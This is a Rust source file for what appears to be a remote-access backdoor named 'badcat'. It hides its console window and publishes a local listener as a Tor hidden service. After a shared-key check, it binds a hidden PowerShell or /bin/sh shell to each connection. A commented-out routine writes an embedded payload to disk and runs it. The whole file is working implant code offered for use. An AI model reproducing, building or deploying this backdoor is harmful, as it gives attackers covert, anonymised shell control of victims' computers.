// hides console window
#![windows_subsystem = "windows"]

mod config;
mod setting;

use std::net::{TcpListener, TcpStream};
use std::path::PathBuf;
use std::process::{Child, Command, Stdio};
use std::{error};
use std::io::{Read, Write};

use badcat_lib::io;
use tor::Tor;

fn main() -> Result<(), Box<dyn error::Error>> {
    let setting = setting::Setting::new()?;

    start_tcp_server(&setting)?;

    Ok(())
}

fn unbundle_torrc(
    path: &PathBuf,
    port: u16,
    setting: &setting::Setting,
) -> Result<(), Box<dyn error::Error>> {
    let mut contents = setting.torrc.clone();

    contents = contents.replace("@{DATA_DIR}", setting.tor_dir.to_str().unwrap());

    contents = contents.replace(
        "@{CTRL_COOKIE}",
        setting.tor_dir.join("ctrl.cookie").to_str().unwrap(),
    );

    contents = contents.replace(
        "@{CTRL_SOCKET}",
        setting.tor_dir.join("ctrl.socket").to_str().unwrap(),
    );

    contents = contents.replace("@{SERVICE_ADDR}", &format!("127.0.0.1:{}", port));

    std::fs::write(&path, &contents)?;

    Ok(())
}

fn start_tor(
    config: &PathBuf,
    setting: &setting::Setting,
) -> Result<Tor, Box<dyn error::Error>> {
    // Fix directory permission - linux build requires this
    if cfg!(unix) || cfg!(macos) {
        let status = Command::new("chmod")
            .args(["700", setting.tor_dir.to_str().unwrap()])
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .status()?;

        if !status.success() {
            return Result::Err(String::from("problem setting app directory permision").into());
        }
    }

    let tor = Tor::new(config);
    
    Ok(tor)
}

fn start_tcp_server(setting: &setting::Setting) -> Result<(), Box<dyn error::Error>> {
    let listener = TcpListener::bind("127.0.0.1:0")?;
    let port = listener.local_addr()?.port();
    println!("listening at: {:?}", port);

    let config = &setting.tor_dir.join("config");
    unbundle_torrc(&config, port, &setting)?;

    let tor = start_tor(&config, &setting)?;
    
    let mut payload_proc: Option<Child> = None;

    for stream in listener.incoming() {
        match stream {
            Ok(mut stream) => {
                if let Ok(()) = authenticate(&mut stream, &setting) {
                    if setting.uses_payload {
                        if let Some(proc) = &mut payload_proc {
                            proc.kill().unwrap_or_else(|_| {
                                //
                            });
                        }

                        // if let Ok(proc) = execute_payload(setting) {
                        //     payload_proc = Some(proc);
                        // }
                    } else {
                        match bind_shell(stream) {
                            Ok(()) => {}
                            Err(error) => println!("connection error: {:?}", error),
                        };
                    }
                }
            }
            Err(error) => return Err(Box::new(error)),
        }
    }

    tor.stop()?;

    Ok(())
}

fn authenticate(
    stream: &mut TcpStream,
    setting: &setting::Setting,
) -> Result<(), Box<dyn error::Error>> {
    let mut buf = Vec::new();

    // allocate a buffer size of key length
    for _ in 0..setting.key.len() {
        buf.push(0);
    }

    if let Err(err) = stream.read_exact(&mut buf) {
        return Err(err.into());
    }

    let untrusted_key = String::from_utf8_lossy(&buf);

    let equals = untrusted_key.eq(&setting.key);

    let reply = if equals { &[1] } else { &[0] };

    if let Err(err) = stream.write(reply) {
        return Err(err.into());
    }

    if let Err(err) = stream.flush() {
        return Err(err.into());
    }

    if equals {
        Ok(())
    } else {
        Err(String::from("not authenticated").into())
    }
}

fn bind_shell(stream: TcpStream) -> Result<(), Box<dyn error::Error>> {
    let mut args: Vec<&str> = Vec::new();

    let shell = if cfg!(windows) {
        // used powershell instead of cmd because of hidden console window
        args.extend(["-WindowStyle", "Hidden"]);
        "powershell"
    } else {
        args.push("-i");
        "/bin/sh"
    };

    let proc = Command::new(shell)
        .args(args)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()?;

    let stdin = proc.stdin.unwrap();
    let stdout = proc.stdout.unwrap();
    let stderr = proc.stderr.unwrap();

    let stream_in = stream.try_clone()?;
    let stream_out = stream.try_clone()?;
    let stream_err = stream.try_clone()?;

    let in_thread = io::pipe_io(stream_in, stdin);
    let out_thread = io::pipe_io(stdout, stream_out);
    let err_thread = io::pipe_io(stderr, stream_err);

    in_thread.join().unwrap();
    out_thread.join().unwrap();
    err_thread.join().unwrap();

    Ok(())
}

// fn execute_payload(
//     setting: &setting::Setting
// ) -> Result<Child, Box<dyn error::Error>> {
//     let payload = setting::decode_payload(setting)?;

//     let payload_dir = setting.tor_dir.join("payload");

//     if !payload_dir.exists() {
//         fs::create_dir(&payload_dir)?;
//     }

//     let executable = executable_name(setting, Some(&payload_dir));

//     {
//         let mut file = File::create(&executable)?;
//         file.write(&payload.data)?;
//         file.flush()?;
//     }

//     let proc = Command::new(executable).spawn()?;

//     Ok(proc)
// }
